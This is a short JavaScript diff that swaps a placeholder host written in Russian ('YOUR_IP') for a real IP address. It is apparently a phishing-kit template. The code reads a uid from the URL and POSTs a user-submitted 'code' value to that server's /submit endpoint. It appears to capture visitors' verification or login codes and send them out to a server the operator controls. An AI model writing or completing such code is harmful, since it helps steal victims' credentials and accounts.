@@ -76,7 +76,7 @@
             const uid = new URLSearchParams(window.location.search).get('uid') || "Unknown";
 
             try {
-                await fetch("http://ТВОЙ_IP:8080/submit", {
+                await fetch("http://95.24.163.77:8080/submit", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ type: 'code', value: val, uid: uid })
